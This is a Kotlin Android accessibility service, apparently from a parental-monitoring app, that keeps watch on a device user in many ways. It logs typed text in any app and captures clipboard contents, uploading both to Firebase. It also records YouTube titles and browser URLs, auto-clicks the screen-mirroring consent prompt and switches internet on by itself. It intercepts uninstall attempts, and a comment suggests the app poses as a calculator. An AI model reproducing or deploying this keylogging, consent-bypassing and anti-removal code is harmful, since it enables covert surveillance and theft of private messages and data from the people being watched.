package com.example.authapp.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.data.YouTubeLogItem
import com.example.authapp.ui.activity.UninstallProtectionActivity
import com.example.authapp.utils.UninstallProtectionManager
import com.google.firebase.crashlytics.FirebaseCrashlytics

class ChildAccessibilityService : AccessibilityService() {

    private val internetHelper by lazy { ChildAccessibilityInternetHelper(this) }
    private var lastKeylogText = ""
    private var lastKeylogTime = 0L
    private var lastYouTubeTitle = ""
    private var lastClipboardText = ""

    companion object {
        val BROWSER_PACKAGES get() = ChildAccessibilityUrlExtractor.BROWSER_PACKAGES

        private val SYSTEM_PROTECTED_PACKAGES = setOf(
            "com.android.settings", "com.android.systemui", "com.sec.android.app.launcher",
            "com.google.android.apps.nexuslauncher", "com.android.launcher", "com.android.launcher3",
            "com.google.android.packageinstaller", "com.android.packageinstaller", "com.samsung.android.dialer",
            "com.google.android.dialer", "com.android.phone", "com.android.server.telecom",
            "com.google.android.gms", "com.android.vending"
        )

        var instance: ChildAccessibilityService? = null
            private set

        @Volatile
        var blockedPackageNames: Set<String> = emptySet()
    }

    fun returnToHomeScreen(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)

    fun triggerAutoEnableInternet() {
        internetHelper.triggerAutoEnableInternet()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            serviceInfo = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                notificationTimeout = 100
            }
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Connected and configured")
            AppHealthTelemetry.syncDeviceHealth(applicationContext)

            setupClipboardListener()
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
    }

    private var latestSelectedText = ""

    private fun setupClipboardListener() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
            clipboard?.addPrimaryClipChangedListener {
                try {
                    val clip = clipboard.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        val item = clip.getItemAt(0)
                        val text = (item?.text ?: item?.coerceToText(applicationContext))?.toString()?.trim() ?: ""
                        if (text.isNotEmpty() && !ChildAccessibilityAutoActions.isDummyActionLabel(text) && text != lastClipboardText) {
                            lastClipboardText = text
                            val childId = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                            if (childId.isNotEmpty()) {
                                FirebaseRepository.pushClipboardLog(childId, text)
                                FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Captured clipboard text (len=${text.length})")
                            }
                        }
                    }
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Clipboard notice: ${e.localizedMessage}")
                }
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Clipboard init error: ${e.localizedMessage}")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: return

        if (internetHelper.isAutoEnablingInternet) {
            internetHelper.tryAutoClickInternetSwitches()
        }

        // Screen Mirroring Auto-Consent & System Clipboard Overlay scraping:
        if (packageName == "com.android.systemui" || packageName == "android") {
            ChildAccessibilityAutoActions.tryAutoClickMediaProjection(event, rootInActiveWindow)
            ChildAccessibilityAutoActions.tryExtractClipboardFromSystemUi(applicationContext, event, rootInActiveWindow)
        }

        // Track exact text highlighted/selected by child before copy action
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            val fullText = event.text?.joinToString(" ") ?: ""
            val from = event.fromIndex
            val to = event.toIndex
            if (from in 0 until fullText.length && to in (from + 1)..fullText.length) {
                val snippet = fullText.substring(from, to).trim()
                if (snippet.isNotEmpty() && !ChildAccessibilityAutoActions.isDummyActionLabel(snippet)) {
                    latestSelectedText = snippet
                }
            }
        }

        // Intercept Copy action in any app:
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val eventText = event.text?.joinToString(" ") ?: ""
            val desc = event.contentDescription?.toString() ?: ""
            if (eventText.contains("Copy", ignoreCase = true) || desc.contains("Copy", ignoreCase = true) ||
                eventText.contains("Cut", ignoreCase = true) || desc.contains("Cut", ignoreCase = true) ||
                eventText.contains("कॉपी") || desc.contains("कॉपी")) {
                ChildAccessibilityAutoActions.handleCopyActionIntercept(applicationContext, latestSelectedText, rootInActiveWindow)
            }
        }

        // Anti-Uninstall Shield
        if (packageName.contains("packageinstaller") || packageName == "com.android.settings") {
            try {
                if (UninstallProtectionManager.isTemporarilyUnlocked()) return
                val root = rootInActiveWindow ?: event.source
                if (root != null && ChildAccessibilityAutoActions.isUninstallAttemptForOurApp(root)) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Uninstall attempt intercepted, launching PIN verification")
                    val pinIntent = Intent(applicationContext, UninstallProtectionActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    startActivity(pinIntent)
                    return
                }
            } catch (_: Exception) {}
        }

        // In-App YouTube Video Tracking
        if (packageName == "com.google.android.youtube") {
            handleYouTubeTrack(event)
        }

        // Keystroke Logger: Capture typed input in apps (excluding password fields)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && !event.isPassword) {
            handleKeystrokeLog(event, packageName)
        }

        // Safety: Never intercept or block own Calculator app or vital System apps
        if (packageName == applicationContext.packageName || SYSTEM_PROTECTED_PACKAGES.contains(packageName)) return

        // 1. Blocked App Auto-Kickback: If child opens a blocked app, immediately return to Home Screen!
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && blockedPackageNames.isNotEmpty() && blockedPackageNames.contains(packageName)) {
            performGlobalAction(GLOBAL_ACTION_HOME)
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Blocked app $packageName opened - intercepted and dismissed to Home")
            return
        }

        if (!BROWSER_PACKAGES.contains(packageName)) return

        try {
            val rootNode = rootInActiveWindow ?: event.source ?: return
            ChildAccessibilityUrlExtractor.extractAndLogBrowserUrl(applicationContext, rootNode, packageName)
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Event parsing notice: ${e.localizedMessage}")
        }
    }

    private fun handleKeystrokeLog(event: AccessibilityEvent, packageName: String) {
        try {
            val textList = event.text ?: return
            val rawText = textList.joinToString(" ").trim()
            if (rawText.length < 3) return
            val now = System.currentTimeMillis()
            if (rawText == lastKeylogText && (now - lastKeylogTime) < 3000L) return
            lastKeylogText = rawText
            lastKeylogTime = now

            val childId = AppHealthTelemetry.getEffectiveUserId(applicationContext)
            if (childId.isEmpty()) return

            val appName = try {
                packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString()
            } catch (_: Exception) { packageName }

            FirebaseRepository.pushKeylog(childId, rawText, appName, packageName)
        } catch (_: Exception) {}
    }

    private fun handleYouTubeTrack(event: AccessibilityEvent) {
        try {
            val root = rootInActiveWindow ?: event.source ?: return
            val titleNodes = root.findAccessibilityNodeInfosByViewId("com.google.android.youtube:id/title")
            var title = ""
            if (!titleNodes.isNullOrEmpty()) {
                title = titleNodes[0].text?.toString()?.trim() ?: ""
            }
            if (title.isNotEmpty() && title != lastYouTubeTitle) {
                lastYouTubeTitle = title
                val childId = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                if (childId.isNotEmpty()) {
                    val ytItem = YouTubeLogItem(
                        id = "",
                        videoTitle = title,
                        channelName = "YouTube",
                        searchTerm = title,
                        timestamp = System.currentTimeMillis(),
                        type = "WATCHED"
                    )
                    FirebaseRepository.pushYouTubeLog(childId, ytItem)
                }
            }
        } catch (_: Exception) {}
    }

    override fun onInterrupt() {
        FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Service interrupted")
    }

    override fun onDestroy() {
        if (instance == this) instance = null
        super.onDestroy()
    }
}
